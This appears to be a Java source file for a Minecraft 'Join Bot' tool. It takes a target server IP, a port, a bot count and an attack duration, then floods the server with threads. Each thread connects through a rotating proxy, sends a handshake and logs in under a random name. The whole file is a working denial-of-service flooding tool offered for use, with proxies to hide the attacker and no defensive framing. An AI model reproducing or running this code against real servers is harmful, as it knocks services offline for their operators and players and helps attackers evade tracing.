package bot.sfclog;


import java.io.DataOutputStream;
import java.io.IOException;
import java.lang.reflect.InvocationTargetException;
import java.net.InetSocketAddress;
import java.net.Proxy;
import java.net.Socket;
import java.util.Random;
import java.util.UUID;
import java.util.concurrent.TimeUnit;

public class SFC_Bot {
	private static final LoadFileProxy loadFileProxy = new LoadFileProxy();

	private static Random random = new Random();

	public static int threads = 0;
	public static int number = 0;
	
	public static void pingBytes(int n) {
		number = n;
	}

	public static void main(String[] args) {
		if (args.length == 4) {
			try {
				SFC_Bot.pingThreadCrasher(args[0], Integer.valueOf(args[1]), Integer.valueOf(args[2]),
						Integer.valueOf(args[3]));
			} catch (NumberFormatException | InterruptedException e) {
			}
		} else {
			System.out.println("---------------------");
			System.out.println("");
			System.out.println("/////  /////  ///// (Beta Build !)");
			System.out.println("//     //     //    ");
			System.out.println("/////  /////  //    ");
			System.out.println("   //  //     //    ");
			System.out.println("/////  //     ///// ");
			System.out.println("                     (Join Bot Tools)");
			System.out.println("---------------------");
			System.out.println("Thieu Thong Tin !");
			System.out.println("------------------------------------------------");
			System.out.println("java -Xmx1G -jar joinbot.jar IP-Server Port-Server So-Luong-Bot Thoi-Gian-Tan-Cong");
			System.out.println("------------------------------------------------");
		}
	}

	public static void pingThreadCrasher(String host, int port, int maxThreads, long time) throws InterruptedException {
		System.out.println("---------------------");
		System.out.println("");
		System.out.println("/////  /////  ///// (12/8/2020)");
		System.out.println("//     //     //    ");
		System.out.println("/////  /////  //    ");
		System.out.println("   //  //     //    ");
		System.out.println("/////  //     ///// ");
		System.out.println("                     (Join Bot Tools)");
		System.out.println("---------------------");
		System.out.println("JoinBot Server Minecraft !");
		System.out.println();
		System.out.println("IP Server: " + host);
		System.out.println("Port Server: " + port);
		System.out.println("Max Bot: " + maxThreads);
		System.out.println("Time Join Bot: " + time);
		System.out.println("Status: Enable !");
		System.out.println("---------------------");
		Thread.sleep(3000);

		time = TimeUnit.SECONDS.toMillis(time);
		long time1 = System.currentTimeMillis();

		do {
			if (threads < maxThreads) {
				new Thread() {

					@Override
					public void run() {
						++threads;
						try {
							SFC_Bot.pingBytes(number + 1);

							SFC_Bot.botjoiner(host, port);

							System.out.println("Join-Bot# " + number);
						} catch (Exception exception) {
						}
						--threads;
					}
				}.start();
			}
		} while ((System.currentTimeMillis() - time1) < time);
		System.out.println("---------------------");
		System.out.println("");
		System.out.println("/////  /////  ///// (12/8/2020)");
		System.out.println("//     //     //    ");
		System.out.println("/////  /////  //    ");
		System.out.println("   //  //     //    ");
		System.out.println("/////  //     ///// ");
		System.out.println("                     (Join Bot Tools)");
		System.out.println("---------------------");
		System.out.println("JoinBot Server Minecraft !");
		System.out.println("Sub Of SFC_Log ? !");
		System.out.println("Status: Disable !");
		System.out.println("---------------------");
		System.exit(0);
	}
	
	public static void botjoiner(String host, int port)
			throws NoSuchFieldException, SecurityException, IllegalArgumentException, IllegalAccessException,
			NoSuchMethodException, InvocationTargetException, IOException, InterruptedException {
		
			Proxy proxy = loadFileProxy.nextProxy();
	
			@SuppressWarnings("resource")
			Socket socket = new Socket(proxy);
		
			System.out.println("Load-Proxy: " + proxy.address());
	
			socket.connect(new InetSocketAddress(host, port));
			
	        Thread.sleep(1000L);
			
			DataOutputStream out = new DataOutputStream(socket.getOutputStream());

			MinecraftServerPacket.sendPacket(MinecraftServerPacket.createHandshakeMessage18(host, port, 2), out);

			if (random.nextBoolean()) {
				MinecraftServerPacket.sendPacket(MinecraftServerPacket.createLogin("SFC_" + random.nextInt(9999)), out);

			} else {

				if (random.nextBoolean()) {
					MinecraftServerPacket.sendPacket(MinecraftServerPacket.createLogin("" + UUID.randomUUID().toString().split("-")[0]), out);
					}
				}
			}
		}
	
